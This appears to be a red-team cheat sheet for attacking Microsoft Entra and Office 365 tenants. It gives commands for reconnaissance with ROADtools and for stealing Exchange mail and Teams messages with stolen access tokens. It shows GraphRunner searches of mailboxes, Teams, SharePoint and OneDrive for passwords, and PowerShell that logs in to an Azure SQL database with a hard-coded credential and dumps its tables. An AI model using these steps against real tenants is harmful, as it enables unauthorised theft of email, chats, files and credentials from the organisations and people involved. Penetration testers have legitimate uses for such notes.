
### General Recon

Gather info about Entra with **ROADTools**
https://github.com/dirkjanm/ROADtools
```bash
roadrecon gather
```

Determine if tenant is using teams, outlook, sharepoint.
```powershell
Get-MgUserLicenseDetail -UserId "user.one@domain.com"
```
If "O365_BUSINESS_ESSENTIALS" then YES!

## Email

**Stealing exchange email**
https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py
Add access token to script and run.
```bash
python3 exfil_exchange_mail.py
```

**GraphRunner**
https://github.com/dafthack/GraphRunner/
```powershell
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 40
```

## MSTeams

**Stealing teams messages**
https://github.com/Gerenios/AADInternals
```bash
Import-Module ./AADInternals.psm1
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | fl id,content,deletiontime,*type*,DisplayName
```

**GraphRunner**
https://github.com/dafthack/GraphRunner/
```powershell
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
```
## SharePoint & OneDrive

**Searching for creds**
**GraphRunner**
https://github.com/dafthack/GraphRunner/
```powershell
Get-GraphTokens
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm password
```
Graphrunner will ask if you'd like to download the files it finds.


### SQL 

**Connect**
```powershell
$conn = New-Object System.Data.SqlClient.SqlConnection
$password='$reporting$123'
$conn.ConnectionString = "Server=mbt-finance.database.windows.net;Database=Finance;User ID=financereports;Password=$password;"
$conn.Open()
```

**Enum**
```powershell
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables
```

**Query**
```powershell
$sqlcmd = $conn.CreateCommand()
$sqlcmd.Connection = $conn
$query = "SELECT * FROM Subscribers;"
$sqlcmd.CommandText = $query
$adp = New-Object System.Data.SqlClient.SqlDataAdapter $sqlcmd
$data = New-Object System.Data.DataSet
$adp.Fill($data) | Out-Null
$data.Tables | ft
```